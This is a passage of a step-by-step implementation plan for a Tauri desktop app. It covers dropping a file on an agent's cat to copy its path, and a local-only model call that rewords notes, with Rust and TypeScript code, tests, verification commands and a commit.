  /** Where the pointer is, in physical pixels of the window (Tauri gives it with enter, over and drop). */
  position?: { x: number; y: number };
}''')

edit("windows/src/cat/minibots.ts", r'''export function releaseMiniBot(canvas: HTMLCanvasElement) {''', r'''/** A one-off face on every live mini cat of a pill (the happy look after a path was copied for its agent). */
export function emoteMiniBots(taskId: string, name: BotEmoteName) {
  for (const mb of live.values()) if (mb.taskId === taskId) mb.engine.triggerEmote(name);
}

export function releaseMiniBot(canvas: HTMLCanvasElement) {''')
edit("windows/src/cat/minibots.ts", r'''import { State } from "../core/state.ts";
''', r'''import { State } from "../core/state.ts";
import type { BotEmoteName } from "../core/layout.ts";
''')

edit("windows/src/island/hooks.ts", r'''    if (isExternalAgent) {
      State.upsertExternalAgent(agentId, validAgent!, agentColor(validAgent!));
    } else {''', r'''    if (isExternalAgent) {
      State.upsertExternalAgent(agentId, validAgent!, agentColor(validAgent!));
      // The project folder of the agent's session, as the Claude Code pill keeps its own: the Sidekick's drop on an agent's cat opens it. Memory only, never the ledger.
      const pill = State.tasks.find((x) => x.id === agentId);
      if (pill && cwd) pill.sessionCwd = cwd;
    } else {''')

edit("windows/src/island/island.ts", r'''import { Hub } from "../sidekick/hub.ts";
''', r'''import { Hub } from "../sidekick/hub.ts";
import { NOT_COPIED_LINE, agentCatAt, copiedLine, dropAgents, dropPoint, pathsText } from "../sidekick/agentdrop.ts";
import { platformName } from "../sidekick/platform.ts";
import { emoteMiniBots } from "../cat/minibots";
import { AgentDropStrip } from "../views/agentdrop";
''')
edit("windows/src/island/island.ts", r'''  private header!: ViewHost;
  private views!: Map<IslandViewName, ViewHost>;''', r'''  /** The agents' cats shown while a file is dragged over the island (sub-project F1): a drop on one copies the file's path. */
  private agentDrops = new AgentDropStrip();
  private header!: ViewHost;
  private views!: Map<IslandViewName, ViewHost>;''')
edit("windows/src/island/island.ts", r'''      this.miniGrid,
      this.countdown,
    );''', r'''      this.miniGrid,
      this.countdown,
      this.agentDrops.el,
    );''')
edit("windows/src/island/island.ts", r'''  private onDragDrop(e: { type: string; paths?: string[] }) {''', r'''  /** The agent whose cat is under a point of the page (or the pointer's last position): one of the chips shown while a file is dragged. */
  private agentUnder(position?: { x: number; y: number }): string | null {
    const p = dropPoint(position, window.devicePixelRatio || 1, { x: State.mouse.x, y: State.mouse.y });
    return agentCatAt(p.x, p.y, this.agentDrops.targets());
  }

  /**
   * A file was dropped on an agent's cat: its path goes to the clipboard, the agent's project is brought forward where the system lets it (Windows: the "Open terminal" action;
   * Linux: nothing), the agent's cat is happy, and one line says what happened. Nothing is pasted, typed or sent, no session is touched, and the line never says "sent".
   */
  private handoff(agentId: string, paths: string[] | undefined) {
    const text = pathsText(paths);
    const show = (line: string) => {
      State.noteMessage = line;
      this.setView("note");
      window.setTimeout(() => {
        if (State.view === "note" && State.noteMessage === line) this.setView(State.defaultView());
      }, 2400);
    };
    if (text === null) {
      show(NOT_COPIED_LINE);
      return;
    }
    void Bridge.copyText(text).then((ok) => {
      if (!ok) {
        show(NOT_COPIED_LINE);
        return;
      }
      if (platformName() === "windows") void Bridge.openInVSCode(State.tasks.find((t) => t.id === agentId)?.sessionCwd ?? null);
      emoteMiniBots(agentId, "happy");
      show(copiedLine(agentId));
    });
  }

  private onDragDrop(e: { type: string; paths?: string[]; position?: { x: number; y: number } }) {''')
edit("windows/src/island/island.ts", r'''      case "enter":
      case "over": {
        if (State.fileDragOver) return;
        State.fileDragOver = true;
        // enterZone must run before the island expands, so the sequence is
        // already active by the time the view becomes `upload`.
        UploadSeq.enterZone(State.mouseInIsland.x, State.mouseInIsland.y);
        this.uploadCanvas.hover(true);
        this.alert("upload");
        break;
      }''', r'''      case "enter":
      case "over": {
        this.agentDrops.hover(this.agentUnder(e.position));
        if (State.fileDragOver) return;
        State.fileDragOver = true;
        // enterZone must run before the island expands, so the sequence is
        // already active by the time the view becomes `upload`.
        UploadSeq.enterZone(State.mouseInIsland.x, State.mouseInIsland.y);
        this.uploadCanvas.hover(true);
        this.alert("upload");
        // A chip for each running agent a path could be handed to, in every display mode.
        this.agentDrops.show(dropAgents(State.tasks, State.cast, Hub.sk?.ledger.live.map((s) => s.agentId) ?? []));
        break;
      }''')
edit("windows/src/island/island.ts", r'''        State.fileDragOver = false;
        // The island deliberately stays open: the drag session is still alive.
        UploadSeq.exitZone();
        this.uploadCanvas.hover(false);
        State.notify();
        break;
      }
      case "drop": {
        State.fileDragOver = false;''', r'''        State.fileDragOver = false;
        this.agentDrops.hide();
        // The island deliberately stays open: the drag session is still alive.
        UploadSeq.exitZone();
        this.uploadCanvas.hover(false);
        State.notify();
        break;
      }
      case "drop": {
        // A drop on an agent's own cat is tested first, before every other drop rule; the big cat is never one of them. Anywhere else the drop is the one the island always had.
        const agent = this.agentUnder(e.position);
        this.agentDrops.hide();
        if (agent !== null) {
          State.fileDragOver = false;
          UploadSeq.exitZone();
          this.uploadCanvas.hover(false);
          this.handoff(agent, e.paths);
          break;
        }
        State.fileDragOver = false;''')
edit("windows/src/island/island.ts", r'''  onCursor(x: number, y: number) {
    State.mouse = { x, y };''', r'''  onCursor(x: number, y: number) {
    State.mouse = { x, y };
    // While a file is dragged the cursor poll goes on: the chip of the agent whose cat is under it lights up.
    if (State.fileDragOver) this.agentDrops.hover(agentCatAt(x, y, this.agentDrops.targets()));''')
PY
```

```bash
cat >> windows/src/style.css <<'EOF'

/* ── The agents' cats while a file is dragged over the island (sub-project F1): new class names only ───────────────────────────────────── */
#agent-drops {
  position: absolute;
  right: 14px;
  top: 52px;
  z-index: 6;
  display: none;
  flex-direction: column;
  align-items: flex-end;
  gap: 6px;
  pointer-events: none;
}
#agent-drops.on {
  display: flex;
}
.ad-hint {
  font: 400 11px var(--font);
  color: var(--dim);
}
.ad-chip {
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 3px 12px 3px 6px;
  border-radius: 999px;
  background: rgba(255, 255, 255, 0.08);
  border: 1px solid rgba(255, 255, 255, 0.1);
  font: 500 12px var(--font);
  color: #e8e9ec;
}
.ad-chip.hot {
  background: rgba(245, 165, 36, 0.22);
  border-color: rgba(245, 165, 36, 0.7);
}
EOF
```

```bash
( cd windows && npm run check:sidekick 2>&1 | grep -E "^ℹ (tests|pass|fail)" )
```

Expected: `ℹ fail 0`, `ℹ tests 87`, `ℹ pass 87`.

```bash
( cd windows && npx --no-install tsc --noEmit; echo "tsc exit $?" )
```

Expected: `tsc exit 0`.

```bash
( cd windows && npm run check:cat 2>&1 | grep -E "^ℹ (pass|fail)" )
```

Expected: `ℹ pass 372`, `ℹ fail 0`.

- [ ] **Step 3: Prove the order is pinned**

Testing the agent cat after the old drop rules would let the old drop swallow the file. The pin must fail.

```bash
( cd windows && python3 ../.claude/checkpoints/f1-tauri/mut.py src/island/island.ts 'const agent = this.agentUnder(e.position);' 'const agent = null as string | null;' scripts/sidekick-tests/agentdrop.test.mjs )
```

Expected: `# fail 1`.

- [ ] **Step 4: Drop on a chip, in the browser**

There is no OS drag in a plain browser, so the island's own handler is called with the events Tauri sends. Open `?display=perAgent`, start two other agents (`__nm.run.agents()`), "drag" over the island, look, hover a chip, drop on it. `Bridge.copyText` is replaced by a recorder (the app's page imports the module with a `?t=` query: find it first).

```bash
( cd .claude/checkpoints/f1-tauri && playwright-cli -s=f1 goto "http://127.0.0.1:14711/?display=perAgent" > /dev/null; sleep 4; playwright-cli -s=f1 resize 760 340 > /dev/null; playwright-cli -s=f1 eval "performance.getEntriesByType('resource').map(r=>r.name).filter(n=>n.includes('core/bridge'))" | sed -n 2,5p )
```

Expected: `core/bridge.ts`.

Use the `?t=…` URL it printed in the next command (it is the page's own `Bridge`):

```bash
( cd .claude/checkpoints/f1-tauri && cat > scn-drop.js <<'EOF'
(async () => {
  const nm = window.__nm;
  const name = performance.getEntriesByType('resource').map(r => r.name).find(n => /core\/bridge\.ts\?t=/.test(n));
  const b = await import(name);
  window.__copied = null;
  b.Bridge.copyText = async (t) => { window.__copied = t; return true; };
  nm.run.agents();
  nm.island.onDragDrop({ type: 'enter', paths: ['C:/x/a.txt'] });
  await new Promise(r => setTimeout(r, 900));
  const chips = [...document.querySelectorAll('.ad-chip')].map(c => { const r = c.getBoundingClientRect(); return { t: c.textContent, x: r.x + r.width / 2, y: r.y + r.height / 2 }; });
  const gem = chips.find(c => c.t === 'Gemini CLI');
  nm.island.onDragDrop({ type: 'over', paths: [], position: { x: gem.x, y: gem.y } });
  window.__hot = [...document.querySelectorAll('.ad-chip.hot')].map(c => c.textContent);
  window.__chips = chips.map(c => c.t);
  nm.island.onDragDrop({ type: 'drop', paths: ['C:/x/a.txt', 'C:/x/b c.txt'], position: { x: gem.x, y: gem.y } });
  await new Promise(r => setTimeout(r, 800));
  return { chips: window.__chips, hot: window.__hot, copied: window.__copied, view: nm.State.view, note: nm.State.noteMessage };
})()
EOF
playwright-cli -s=f1 eval "$(cat scn-drop.js)" | sed -n 2,22p; playwright-cli -s=f1 screenshot --filename=drop-line.png > /dev/null; echo drop-line.png )
```

Expected: `Gemini CLI`, `C:/x/a.txt\nC:/x/b c.txt`, `Copied the path`, `paste it into Gemini CLI`, `drop-line.png`.

Say what you saw: the chips (**Antigravity**, **Gemini CLI**), the hovered one lit (`"hot": ["Gemini CLI"]`), the clipboard text `C:/x/a.txt` then `C:/x/b c.txt` on two lines with no quotes, the view `note` and **"Copied the path — paste it into Gemini CLI"**. (`openInVSCode` is not called here: the headless browser reports the Linux platform.)

- [ ] **Step 5: Commit**

```bash
git rev-parse --show-toplevel; git branch --show-current
git add windows/src windows/scripts/sidekick-tests
git commit -F - <<'MSG'
feat(sidekick): drop on an agent's cat: the chips, the hand-over and the honest line

Co-Authored-By: Claude Haiku 5.5 <noreply@anthropic.com>
MSG
```

Expected: `f1/tauri-sidekick`.

### Task 12: The local voice: `ai_oneshot`, `ai_local_model` and the swap

**Files:**
- Create: `windows/src-tauri/src/ai/oneshot.rs`, `windows/src/sidekick/voice.ts`, `windows/scripts/sidekick-tests/voice.test.mjs`
- Modify: `windows/src-tauri/src/ai/mod.rs` (`pub mod`, `local_target`, `ai_oneshot`, `ai_local_model`), `ai/session.rs` (`rediscover` is `pub(crate)`), `lib.rs` (registration), `windows/src/sidekick/controller.ts`, `appenv.ts`, `statuschat.ts`, `windows/src/core/bridge.ts`, `windows/src/island/island.ts` (`pointerInside`), `windows/src/views/views.ts`, `chat.ts`, `windows/src/settings/main.ts`, `windows/src/style.css`, `windows/scripts/sidekick-tests/status.test.mjs`

**Interfaces:**
- Consumes: the router's `local_choice`, `Ready`, `ModelRef`, `RouteInput`, the provider trait's `stream`, `Endpoint`, `Placement`; Task 1's `acceptNicerLine`; Task 6's `Notes.reword`; Task 9's `LocalAnswer`.
- Produces: Rust `oneshot::{pick, local_only, request, clean_reply, within_limits, MAX_REQUEST_CHARS (1200), MAX_REPLY_CHARS (400), MAX_REPLY_TOKENS (120), TIMEOUT_SECS (6)}`, the commands `ai_oneshot(system, prompt) → Option<String>` and `ai_local_model() → Option<String>`; TypeScript `allowedFacts`, `voiceRequest`, `nicerLine`, `nicerLines`, `FACT_KEYS`, `OneShot` (`voice.ts`); `SidekickEnv.oneshot`, `hovering()`, `Sidekick.polishLines(lines, facts)`; `Bridge.aiOneshot`, `Bridge.aiLocalModel`; `LocalAnswer.facts`; the Settings "Found: {model}" line.

**What it can reach.** `oneshot::pick` filters the ready models to `Placement::Local` (a server on `127.0.0.1`, `::1` or `localhost`) **before** the router's local rule runs: a network server (the one the user added on another computer) and every cloud provider are never chosen, whatever the chat's settings say, and the Auto choice is never consulted (no new `AIFeature`). `local_target` looks again at the local addresses only (a model started after the app: the 0.3 s probe), reads **no key** (`key: None`), and double-checks the server's own placement. It is one request: one user message, no tools, no history, 120 tokens, 6 s; nothing is stored, the conversation is untouched, **nothing is logged**. Rust refuses a request over 1200 characters. **What it is given** is only the allowed facts of a note (`FACT_KEYS`: an agent's name, a project's basename, counts, up to three file basenames, the state words), picked field by field in the page and never the note's text alone. **The swap:** the template is on screen first; the sentence must pass `acceptNicerLine` (one line, at most 200 characters, no URL, `/`, `\`, backtick or markdown, only numbers that are in the facts, the agent's name), differ from the template, and arrive while the note is still the one on screen and the pointer is not over it; it crossfades in once (`sk-fresh`, 0.4 s). The permission line is never sent anywhere. **The status card in the chat is worded by the same rules.**

- [ ] **Step 1: Write the Rust test file's pure part, and the TypeScript test**

`oneshot.rs` carries its own tests (only a local model is picked; the last-used local one first; one short message with no tools; limits; one clean line). The TypeScript test fakes the model.

```bash
mkdir -p windows/src-tauri/src/ai
cat > windows/src-tauri/src/ai/oneshot.rs <<'EOF'
// The Sidekick's local voice (sub-project F1, spec "The local voice"): one short question to a model that runs on THIS computer, and its answer as one line of text. The pure part: which model
// may be asked, what the request looks like, and what a reply is cleaned to. The commands (`ai_oneshot`, `ai_local_model`) that call the model are in `ai/mod.rs`.
//
// What makes it safe is what it cannot reach. Only a provider whose placement is `Local` (a server on 127.0.0.1, ::1 or localhost) is ever chosen: a server on another computer
// (`Network`) and every cloud provider are filtered out, whatever the chat's own settings say, and the chat's Auto choice is never consulted. It is one request, not a conversation:
// nothing is stored, the chat's history is untouched, no key is read and nothing is logged.

use crate::ai::provider::{ChatRequest, Message, Part, Placement, Role};
use crate::ai::router::{local_choice, Choice, ModelRef, Ready, RouteInput};

/// The longest request, system text and prompt together, in characters. The facts a note is written from are a few dozen words; Apple's on-device model, which the Mac also asks, takes
/// only a few thousand tokens, so the two apps keep to the same small size.
pub const MAX_REQUEST_CHARS: usize = 1_200;
/// The longest reply that is kept, in characters (the page's own check is stricter: 200).
pub const MAX_REPLY_CHARS: usize = 400;
/// The reply is a sentence: a few dozen tokens.
pub const MAX_REPLY_TOKENS: u32 = 120;
/// How long the model may take (seconds). Then there is no sentence and the template stands.
pub const TIMEOUT_SECS: u64 = 6;

/// Whether a request is small enough to send.
pub fn within_limits(system: &str, prompt: &str) -> bool {
    !prompt.trim().is_empty() && system.chars().count() + prompt.chars().count() <= MAX_REQUEST_CHARS
}

/// The models a one-shot may use: those on this computer only.
pub fn local_only(ready: &[Ready]) -> Vec<Ready> {
    ready.iter().filter(|r| r.placement == Placement::Local).cloned().collect()
}

/// The local model to ask: the last-used local one if it is still ready, else the first ready one (`router::local_choice`, the router's own local rule). Never a network or cloud model,
/// and never the Auto choice: this is the one place a note's words could reach a model, and it must be one on this computer.
pub fn pick(ready: &[Ready], last_used_local: Option<&ModelRef>) -> Option<Ready> {
    let local = local_only(ready);
    let input = RouteInput {
        setting: Choice::default(),
        preferred_cloud: String::new(),
        keys: Vec::new(),
        online: true,
        local_ready: local,
        last_used_local: last_used_local.cloned(),
        apple_ready: false,
        failure: None,
    };
    local_choice(&input).filter(|r| r.placement == Placement::Local)
}

/// The request: one user message, no tools, no history.
pub fn request(model: &str, system: &str, prompt: &str) -> ChatRequest {
    ChatRequest {
        model: model.to_string(),
        system: system.to_string(),
        messages: vec![Message { role: Role::User, parts: vec![Part::Text(prompt.to_string())] }],
        tools: Vec::new(),
        response_format: None,
        max_tokens: MAX_REPLY_TOKENS,
    }
}

/// What a reply is cleaned to: its first line that has words in it, trimmed, without the quotes some models put around a sentence, at most `MAX_REPLY_CHARS`. None when nothing is left.
pub fn clean_reply(text: &str) -> Option<String> {
    let line = text.lines().map(str::trim).find(|l| !l.is_empty())?;
    let line = line.trim_matches(|c: char| matches!(c, '"' | '\'' | '`' | '\u{201C}' | '\u{201D}' | '\u{2018}' | '\u{2019}')).trim();
    if line.is_empty() {
        return None;
    }
    Some(line.chars().take(MAX_REPLY_CHARS).collect())
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ready(provider: &str, model: &str, placement: Placement) -> Ready {
        Ready { provider: provider.into(), model: model.into(), placement }
    }

    #[test]
    fn only_a_model_on_this_computer_is_ever_picked() {
        let all = [
            ready("custom", "llama3", Placement::Network),
            ready("anthropic", "claude", Placement::Cloud),
            ready("ollama", "qwen3.5:2b", Placement::Local),
            ready("lmstudio", "local-model", Placement::Local),
        ];
        let chosen = pick(&all, None).unwrap();
        assert_eq!((chosen.provider.as_str(), chosen.placement), ("ollama", Placement::Local), "the first local one");
        assert!(local_only(&all).iter().all(|r| r.placement == Placement::Local));
        assert_eq!(local_only(&all).len(), 2);
        // Network and cloud only: nothing is picked, however ready they are.
        assert_eq!(pick(&all[..2], None), None);
        assert_eq!(pick(&[], None), None);
        // A server on another computer that was the last used one is not preferred over nothing, nor over a local one.
        let last = ModelRef { provider: "custom".into(), model: "llama3".into() };
        assert_eq!(pick(&all[..2], Some(&last)), None);
        assert_eq!(pick(&all, Some(&last)).unwrap().provider, "ollama");
    }

    #[test]
    fn the_last_used_local_model_comes_first_if_it_is_still_ready() {
        let all = [ready("ollama", "qwen3.5:2b", Placement::Local), ready("lmstudio", "local-model", Placement::Local)];
        let last = ModelRef { provider: "lmstudio".into(), model: "local-model".into() };
        assert_eq!(pick(&all, Some(&last)).unwrap().provider, "lmstudio");
        let gone = ModelRef { provider: "jan".into(), model: "x".into() };
        assert_eq!(pick(&all, Some(&gone)).unwrap().provider, "ollama", "a last-used model that is no longer there is not asked for");
    }

    #[test]
    fn a_request_is_one_short_message_with_no_tools_and_no_history() {
        let r = request("qwen3.5:2b", "Reword this note.", "Note: Claude Code ran 3 steps.");
        assert_eq!(r.model, "qwen3.5:2b");
        assert_eq!(r.messages.len(), 1);
        assert_eq!(r.messages[0].role, Role::User);
        assert_eq!(r.messages[0].plain_text(), "Note: Claude Code ran 3 steps.");
        assert!(r.tools.is_empty() && r.response_format.is_none());
        assert_eq!(r.max_tokens, MAX_REPLY_TOKENS);
        assert_eq!(r.system, "Reword this note.");
    }

    #[test]
    fn a_request_that_is_empty_or_too_big_is_not_sent() {
        assert!(within_limits("system", "a note"));
        assert!(!within_limits("system", ""));
        assert!(!within_limits("system", "   \n"));
        assert!(within_limits(&"s".repeat(200), &"p".repeat(1_000)));
        assert!(!within_limits(&"s".repeat(200), &"p".repeat(1_001)));
        assert!(within_limits("é", &"é".repeat(1_199)), "characters, not bytes");
    }

    #[test]
    fn a_reply_is_one_clean_line() {
        assert_eq!(clean_reply("Claude Code finished 3 steps.").as_deref(), Some("Claude Code finished 3 steps."));
        assert_eq!(clean_reply("\n\n  \"Claude Code finished.\"  \nAnd a second line.").as_deref(), Some("Claude Code finished."));
        assert_eq!(clean_reply("\u{201C}Done.\u{201D}").as_deref(), Some("Done."));
        assert_eq!(clean_reply("`ran`").as_deref(), Some("ran"));
        for none in ["", "   ", "\n\n", "\"\"", "''", "``"] {
            assert_eq!(clean_reply(none), None, "{none:?}");
        }
        let long = "x".repeat(1_000);
        assert_eq!(clean_reply(&long).unwrap().chars().count(), MAX_REPLY_CHARS);
    }
}
EOF
```

```bash
python3 - <<'PY'
import pathlib

def edit(path, old, new):
    p = pathlib.Path(path)
    s = p.read_text()
    assert s.count(old) == 1, (path, old[:60], s.count(old))
    p.write_text(s.replace(old, new))

edit("windows/src-tauri/src/ai/mod.rs", r'''pub mod errors;
pub mod openai;
''', r'''pub mod errors;
pub mod oneshot;
pub mod openai;
''')
edit("windows/src-tauri/src/ai/session.rs", r'''    async fn rediscover(&mut self, wanted: Option<&str>) {''', r'''    pub(crate) async fn rediscover(&mut self, wanted: Option<&str>) {''')
edit("windows/src-tauri/src/ai/mod.rs", r'''/// One chat turn, streamed to the island over `on_event`.
#[tauri::command]
#[allow(clippy::too_many_arguments)]
pub async fn ai_chat(''', r'''/// The server and the model a one-shot may ask (sub-project F1, "The local voice"): a model on this computer, looked for again now (a server started after the app was: a 0.3 s look at
/// the local addresses only), chosen by the router's local rule and never by the chat's own choice. None when there is none. No key is read and nothing is logged.
async fn local_target(shared: &Shared, ai: &AiState) -> Option<(Endpoint, String)> {
    let mut env = display_env(shared, ai).await;
    env.probes = probes(&env.settings, None);
    env.rediscover(None).await;
    let ready = session::ready_list(&env);
    let pick = oneshot::pick(&ready, env.settings.last_used_local.as_ref())?;
    let server = env.servers.iter().find(|s| s.provider == pick.provider && s.status == ServerStatus::Running && s.placement == Placement::Local)?;
    let endpoint = Endpoint {
        provider: pick.provider.clone(),
        name: server.name.clone(),
        base_url: server.base_url.clone(),
        key: None,
        placement: server.placement,
        timeouts: Timeouts::for_placement(server.placement),
    };
    Some((endpoint, pick.model))
}

/// The Sidekick's local voice: one short question to a model on this computer (never a network or cloud model, never the chat's Auto choice), and its answer as one line, or null. It
/// is one request, not a conversation: nothing is stored, the chat's history is untouched, and nothing is logged. It gives up after `oneshot::TIMEOUT_SECS` seconds, on any error and
/// when there is no local model: the page then keeps the plain template. The page decides what it may be given (only the facts of a note); this refuses a request over 1200 characters.
#[tauri::command]
pub async fn ai_oneshot(shared: State<'_, Shared>, ai: State<'_, AiState>, system: String, prompt: String) -> Result<Option<String>, String> {
    if !oneshot::within_limits(&system, &prompt) {
        return Ok(None);
    }
    let Some((endpoint, model)) = local_target(&shared, &ai).await else { return Ok(None) };
    let provider = session::make_provider(endpoint);
    let request = oneshot::request(&model, &system, &prompt);
    let mut sink = |_: provider::ChatChunk| {};
    let asked = tokio::time::timeout(Duration::from_secs(oneshot::TIMEOUT_SECS), provider.stream(&request, &mut sink)).await;
    Ok(match asked {
        Ok(Ok(done)) if done.error.is_none() && done.refusal.is_none() => oneshot::clean_reply(&done.text),
        _ => None,
    })
}

/// The name of the local model the Sidekick's wording would come from ("qwen3.5:2b"), or null when there is none: the "Found" line of Settings → Sidekick.
#[tauri::command]
pub async fn ai_local_model(shared: State<'_, Shared>, ai: State<'_, AiState>) -> Result<Option<String>, String> {
    Ok(local_target(&shared, &ai).await.map(|(_, model)| model))
}

/// One chat turn, streamed to the island over `on_event`.
#[tauri::command]
#[allow(clippy::too_many_arguments)]
pub async fn ai_chat(''')
edit("windows/src-tauri/src/lib.rs", r'''            ai::ai_prewarm,
''', r'''            ai::ai_prewarm,
            ai::ai_oneshot,
            ai::ai_local_model,
''')
PY
```

```bash
windows/scripts/cargo-linux.sh test -p notchmeow oneshot --target-dir /repo/windows/target/f1-tauri
```

Expected: `only_a_model_on_this_computer_is_ever_picked`, `a_reply_is_one_clean_line`, `test result: ok`.

```bash
mkdir -p windows/scripts/sidekick-tests
cat > windows/scripts/sidekick-tests/voice.test.mjs <<'EOF'
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import { FACT_KEYS, allowedFacts, nicerLine, nicerLines, voiceRequest } from "../../src/sidekick/voice.ts";
import { Sidekick } from "../../src/sidekick/controller.ts";
import { cleanSidekickSettings } from "../../src/sidekick/core.ts";
import { source } from "./util.mjs";

const T0 = 40_000_000;
const MIN = 60_000;
const SECRETS = ["SECRET-CMD", "SECRET-PATH", "SECRET-PROMPT", "SECRET-WORDS", "SECRET-BODY"];
const fact = { agent: "Claude Code", agentId: "integration_claude", project: "app", steps: 12, stepsAtLeast: false, files: ["a.ts", "b.ts"], more: 0, errors: 1, approvals: 2, end: "finished", quietMinutes: 0 };

test("a model is given only the allowed fields of a fact, cut to a template's sizes; every other field is dropped", () => {
  const hostile = { ...fact, command: SECRETS[0], path: `C:\\${SECRETS[1]}`, prompt: SECRETS[2], last_assistant_message: SECRETS[3], content: SECRETS[4], files: ["a.ts", "b.ts", "c.ts", "d.ts", `C:\\${SECRETS[1]}\\e.ts`, { evil: SECRETS[0] }], project: "p".repeat(500), nested: { command: SECRETS[0] } };
  const got = allowedFacts(hostile);
  assert.deepEqual(Object.keys(got).filter((k) => !FACT_KEYS.includes(k)), []);
  assert.deepEqual(got.files, ["a.ts", "b.ts", "c.ts"], "three names at most, none that is not text or a number");
  assert.equal(got.project.length, 60);
  const text = JSON.stringify(voiceRequest("Claude Code ran 12 steps.", hostile));
  for (const s of SECRETS) assert.ok(!text.includes(s), s);
  for (const odd of [null, undefined, 7, "x", [], [fact]]) assert.deepEqual(allowedFacts(odd), {}, String(odd));
  assert.deepEqual(allowedFacts({ steps: Number.NaN, errors: Number.POSITIVE_INFINITY, end: {}, files: [Number.NaN, null, {}] }), { files: [] }, "a number that is not a number, and a thing that is not text, are no facts");
});

test("a request is short: a normal recap line is well under 800 characters, and the largest one a template can make is under the 1200 Rust allows", () => {
  const normal = voiceRequest("While you were away, Claude Code in app ran 12 steps (1 error, 2 approvals asked), edited a.ts, b.ts and c.ts, and finished.", fact);
  assert.ok(normal.system.length + normal.prompt.length < 800, `${normal.system.length + normal.prompt.length} characters`);
  const big = { ...fact, project: "p".repeat(60), files: ["f".repeat(60), "g".repeat(60), "h".repeat(60)], more: 40 };
  const r = voiceRequest("While you were away, Claude Code in " + "p".repeat(60) + " ran 40 or more steps (3 errors, 12 approvals asked), edited " + "f".repeat(60) + ", " + "g".repeat(60) + " and 41 more, and has been quiet for 30 minutes.", big);
  assert.ok(r.system.length + r.prompt.length < 1200, `${r.system.length + r.prompt.length} characters`);
});

test("a nicer sentence is taken only if the contract's check accepts it; every other answer leaves the template", async () => {
  const template = "Claude Code ran 12 steps in app.";
  const says = (reply) => async () => reply;
  assert.equal(await nicerLine(says("Claude Code worked through 12 steps in app."), template, fact), "Claude Code worked through 12 steps in app.");
  assert.equal(await nicerLine(says("  Claude Code ran 12 steps in app.\n"), template, fact), null, "the same sentence is no change");
  for (const bad of ["Claude Code ran 13 steps in app.", "Claude Code ran 12 steps: see https://example.com", "It ran 12 steps in app.", "Claude Code ran 12 steps in C:\\work\\app.", "Claude Code ran 12 steps.\nAnd more.", "Claude Code `ran` 12 steps.", "**Claude Code** ran 12 steps.", "", "   ", "x".repeat(300) + " Claude Code 12"]) assert.equal(await nicerLine(says(bad), template, fact), null, JSON.stringify(bad));
  for (const reply of [null, undefined, 7, {}, ["Claude Code ran 12 steps."]]) assert.equal(await nicerLine(says(reply), template, fact), null, String(reply));
  assert.equal(await nicerLine(async () => { throw new Error("no model"); }, template, fact), null, "an error is no sentence");
  assert.equal(await nicerLine(() => { throw new Error("sync"); }, template, fact), null);
});

test("lines are worded one by one from their own facts; a line with no fact (\"+2 more\") stays; null when nothing changed", async () => {
  const asked = [];
  const oneshot = async (system, prompt) => { asked.push(prompt); return /Gemini/.test(prompt) ? "Gemini CLI did 3 steps in app." : null; };
  const f2 = { ...fact, agent: "Gemini CLI", agentId: "agent_gemini", steps: 3 };
  const lines = ["While you were away, Claude Code ran 12 steps.", "While you were away, Gemini CLI ran 3 steps.", "+2 more"];
  assert.deepEqual(await nicerLines(oneshot, lines, [fact, f2]), [lines[0], "Gemini CLI did 3 steps in app.", "+2 more"]);
  assert.equal(asked.length, 2, "two lines have facts, the third has none");
  assert.equal(await nicerLines(async () => null, lines, [fact, f2]), null);
});

/** A Sidekick with a fake model, a clock and a note on screen. */
function rig(settings = {}, reply = async (system, prompt) => "Claude Code has run 4 steps and finished in app.") {
  const w = { t: T0, asked: [], presented: [], updated: [], hovering: false, onScreen: true, settings: cleanSidekickSettings(settings) };
  const sk = new Sidekick({
    now: () => w.t, platform: "windows", home: "C:\\Users\\me", idleSeconds: async () => null,
    settings: () => w.settings, saveSettings: (s) => { w.settings = s; },
    world: { ratelimit: () => false, card: () => null, ownCard: () => false, typing: () => false, onScreen: () => w.onScreen },
    present: (n) => w.presented.push(n), updated: (n) => w.updated.push(n),
    oneshot: async (system, prompt) => { w.asked.push({ system, prompt }); return reply(system, prompt); }, hovering: () => w.hovering,
    timer: { set: () => 1, clear: () => {} },
  });
  const hook = (name, extra = {}) => sk.hook({ hook_event_name: name, session_id: "S1", cwd: "C:\\work\\app", ...extra });
  return { w, sk, hook };
}
const settle = () => new Promise((r) => setTimeout(r, 0));
const recapOnReturn = async (r) => {
  r.sk.presenceSignal("lock");
  r.w.t += 5000;
  for (let i = 0; i < 4; i++) { r.hook("PostToolUse", { tool_name: "Bash", tool_input: { command: `SECRET-CMD ${i}` }, prompt: "SECRET-PROMPT" }); r.w.t += 1000; }
  r.hook("Stop", { last_assistant_message: "SECRET-WORDS" });
  r.w.t += 5 * MIN;
  r.sk.presenceSignal("unlock");
  await settle();
};

test("a note is shown with its template first; a nicer sentence from a local model swaps in once; the model saw only the facts", async () => {
  const r = rig({}, async () => "Claude Code finished 4 steps in app and stopped.");
  await recapOnReturn(r);
  assert.equal(r.w.presented.length, 1);
  assert.match(r.w.presented[0].lines[0], /^While you were away, Claude Code in app ran 4 steps and finished\.$/, "the template was shown first");
  assert.deepEqual(r.w.updated.map((n) => n.lines[0]), ["Claude Code finished 4 steps in app and stopped."]);
  assert.equal(r.w.asked.length, 1);
  const seen = JSON.stringify(r.w.asked);
  for (const s of SECRETS) assert.ok(!seen.includes(s), `the model was shown ${s}`);
  assert.match(r.w.asked[0].prompt, /Facts: \{"agent":"Claude Code","project":"app","steps":4/);
  assert.equal(r.sk.notes.current.lines[0], "Claude Code finished 4 steps in app and stopped.");
  await settle();
  assert.equal(r.w.updated.length, 1, "swapped once, and nothing changes after that");
});

test("no swap when the switch is off, when the pointer is over the note, when the note is gone or when the sentence is not accepted; and no request at all when it is off", async () => {
  const off = rig({ local: false });
  await recapOnReturn(off);
  assert.equal(off.w.asked.length, 0, "Nicer wording off: the model is never asked");
  assert.equal(off.w.updated.length, 0);
  const over = rig();
  over.w.hovering = true;
  await recapOnReturn(over);
  assert.equal(over.w.asked.length, 1);
  assert.equal(over.w.updated.length, 0, "the pointer is over the note: it does not change under it");
  const gone = rig({}, async () => { gone.w.onScreen = false; gone.sk.stateChanged(); return "Claude Code finished 4 steps in app and stopped."; });
  await recapOnReturn(gone);
  assert.equal(gone.w.updated.length, 0, "the note was folded away before the sentence came");
  const bad = rig({}, async () => "Claude Code finished 9 steps in app.");
  await recapOnReturn(bad);
  assert.equal(bad.w.updated.length, 0, "a number that is not in the facts");
  const slow = rig({}, async () => { throw new Error("timeout"); });
